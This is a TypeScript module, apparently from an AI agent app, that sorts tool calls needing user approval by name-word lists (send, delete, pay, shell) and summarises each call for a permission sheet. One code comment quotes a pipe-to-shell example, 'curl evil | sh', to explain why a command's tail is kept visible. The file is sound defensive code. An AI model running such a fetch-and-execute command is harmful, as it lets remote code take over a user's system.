import { isSensitiveToolName } from '@shared/privacy/sensitive-tools'
import { ToolRiskTier } from '@shared/types/mcp'
import { t } from 'i18next'

export type PermissionChoice = 'once' | 'always' | 'deny'

/** What a tool call will do, in words for the permission sheet. Built from raw args, shown once, never persisted. */
export type ToolActionSummary = { what: string; why?: string; touches: string[] }

const ALWAYS_ASKS_WORDS = new Set([
  'send',
  'reply',
  'delete',
  'remove',
  'trash',
  'pay',
  'payment',
  'payments',
  'purchase',
  'checkout',
  'transfer',
])
const SEND_WORDS = new Set(['send', 'reply'])
const POSTED_WORDS = new Set(['message', 'messages', 'msg', 'comment', 'reply', 'status', 'tweet'])
const COMMAND_LIKE_PATTERN = /exec|command|shell|terminal/i
const EDIT_TOOLS = new Set(['edit_file', 'create_file', 'apply_workspace_changes'])
const RUN_TOOLS = new Set(['run_local_code', 'prepare_local_execution'])
const WHY_MAX = 140
const COMMAND_MAX = 80
const COMMAND_HEAD = 40

/** Lowercase words of a tool name: splits on `_`, `-`, other separators and camelCase (`sendEmail` → send, email). */
function nameWords(toolName: string): string[] {
  return toolName
    .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
    .replace(/([A-Z]+)([A-Z][a-z])/g, '$1 $2')
    .split(/[^A-Za-z0-9]+/)
    .filter(Boolean)
    .map((word) => word.toLowerCase())
}

/** `send_email`, `sendEmail`, `gmail_reply`, `slack_post_message`. */
function isSendLike(toolName: string): boolean {
  const words = nameWords(toolName)
  return words.some(
    (word, i) => SEND_WORDS.has(word) || (word === 'post' && i + 1 < words.length && POSTED_WORDS.has(words[i + 1]))
  )
}

/** Tools that send, delete, pay, or change workspace files ask every time, whatever Trust says. */
export function alwaysAsks(toolName: string): boolean {
  if (isSensitiveToolName(toolName) || isSendLike(toolName)) return true
  return nameWords(toolName).some((word) => ALWAYS_ASKS_WORDS.has(word))
}

export function canAlways(toolName: string, riskTier: ToolRiskTier): boolean {
  return !alwaysAsks(toolName) && riskTier !== ToolRiskTier.CRITICAL
}

/** `browser_click` → `Browser click`. */
export function toolLabel(toolName: string): string {
  const words = toolName.replace(/[_-]+/g, ' ').trim().toLowerCase()
  return words ? words.charAt(0).toUpperCase() + words.slice(1) : toolName
}

function asRecord(value: unknown): Record<string, unknown> {
  return value && typeof value === 'object' && !Array.isArray(value) ? (value as Record<string, unknown>) : {}
}

function nonEmptyString(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined
  const trimmed = value.trim()
  return trimmed || undefined
}

function stringList(value: unknown): string[] {
  if (Array.isArray(value)) return value.map(nonEmptyString).filter((v): v is string => Boolean(v))
  const single = nonEmptyString(value)
  return single ? [single] : []
}

/** One line: whitespace and newlines collapse to single spaces, cut to the sheet's why length. */
function clipWhy(text: string | undefined): string | undefined {
  if (!text) return undefined
  return cut(text.replace(/\s+/g, ' ').trim(), WHY_MAX) || undefined
}

function cut(text: string, max: number): string {
  return text.length > max ? `${text.slice(0, max - 1)}…` : text
}

/**
 * A command on one line, at most 80 chars. A longer one keeps its first 40 and last 39 chars around "…", so a harmful
 * tail (`… ; curl evil | sh`) is never hidden behind a harmless head.
 */
function cutCommand(command: string): string {
  const line = command.replace(/\s+/g, ' ').trim()
  if (line.length <= COMMAND_MAX) return line
  return `${line.slice(0, COMMAND_HEAD)}…${line.slice(line.length - (COMMAND_MAX - COMMAND_HEAD - 1))}`
}

function hostOf(url: unknown): string | undefined {
  const raw = nonEmptyString(url)
  if (!raw) return undefined
  try {
    return new URL(raw).hostname || undefined
  } catch {
    return undefined
  }
}

function pathsOf(args: Record<string, unknown>): string[] {
  const changes = Array.isArray(args.changes) ? args.changes : []
  return [
    ...stringList(args.path),
    ...stringList(args.file_path),
    ...stringList(args.paths),
    ...changes.flatMap((change) => stringList(asRecord(change).path)),
  ]
}

function firstSentence(description: string | undefined): string | undefined {
  const text = nonEmptyString(description)
  if (!text) return undefined
  const match = text.match(/^.*?[.!?](?=\s|$)/s)
  return clipWhy(match ? match[0] : text)
}

function describeWhat(toolName: string, args: Record<string, unknown>): string {
  const paths = [...new Set(pathsOf(args))]
  const host = hostOf(args.url)
  if (EDIT_TOOLS.has(toolName)) {
    if (paths.length > 1) return t('Edit {{count}} files', { count: paths.length })
    return paths.length === 1 ? t('Edit {{path}}', { path: paths[0] }) : t('Edit files')
  }
  if (toolName === 'delete_file') {
    return paths.length > 0 ? t('Delete {{path}}', { path: paths[0] }) : t('Delete a file')
  }
  if (RUN_TOOLS.has(toolName) || COMMAND_LIKE_PATTERN.test(toolName)) return t('Run a command')
  if (toolName === 'browser_navigate' && host) return t('Open {{host}}', { host })
  if (toolName.startsWith('browser_')) {
    return host ? t('Use the browser on {{host}}', { host }) : t('Use the browser')
  }
  if (toolName.startsWith('computer_')) {
    const action = toolName.slice('computer_'.length).replace(/_+/g, ' ').trim()
    return action ? t('Use your computer: {{action}}', { action }) : t('Use your computer')
  }
  if (isSendLike(toolName)) return t('Send a message')
  return t('Use {{toolLabel}}', { toolLabel: toolLabel(toolName) })
}

/**
 * Summarise a tool call for the permission sheet. Only names paths, hosts, the command (`command`, else `cmd`,
 * `script` or `code`; one line, head and tail kept, at most 80 chars) and recipients; never file content, diffs or
 * stdin.
 */
export function describeToolAction(toolName: string, args: unknown, description?: string): ToolActionSummary {
  const rec = asRecord(args)
  const why =
    clipWhy(nonEmptyString(rec.reason) ?? nonEmptyString(rec.explanation) ?? nonEmptyString(rec.purpose)) ??
    firstSentence(description)

  const touches: string[] = [...pathsOf(rec)]
  const host = hostOf(rec.url)
  if (host) touches.push(host)
  const command =
    nonEmptyString(rec.command) ?? nonEmptyString(rec.cmd) ?? nonEmptyString(rec.script) ?? nonEmptyString(rec.code)
  if (command) touches.push(cutCommand(command))
  if (isSendLike(toolName)) touches.push(...stringList(rec.to), ...stringList(rec.recipient))

  const summary: ToolActionSummary = { what: describeWhat(toolName, rec), touches: [...new Set(touches)] }
  if (why) summary.why = why
  return summary
}
